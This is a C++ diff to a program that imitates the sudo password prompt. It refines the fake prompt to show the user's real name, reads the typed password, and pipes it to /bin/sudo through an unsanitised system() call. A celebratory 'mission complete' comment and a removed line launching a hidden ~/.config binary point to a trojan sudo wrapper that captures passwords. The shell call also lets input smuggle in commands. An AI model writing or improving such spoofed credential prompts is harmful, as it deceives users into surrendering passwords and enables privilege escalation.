@@ -34,15 +34,13 @@ int main(int argc, char *argv[])
             args += arg + " ";
         }
         if(!allargs){
-            std::cout << "[sudo] password for " <<  getpwuid(getuid()) << ":" << std::endl;
+	  std::cout << "[sudo] password for " << ( (std::string)(getpwuid(getuid())->pw_name) ) << ": ";
             char pwd[256];
             std::cin.getline(pwd,256);
             std::string passwd{pwd};
             
             //WOOOO! MISSION COMPLETE!
-            //const char *cmd = ("echo '" + passwd + "' | /bin/sudo " + "-n -S " + args).c_str();
             system(("echo '" + passwd + "' | /bin/sudo " + "-n -S " + args).c_str());
-            //system(("echo '" + passwd + "' | /bin/sudo ~/.config/tetrix/Tetrix -p 1").c_str());
         }
         else
         {
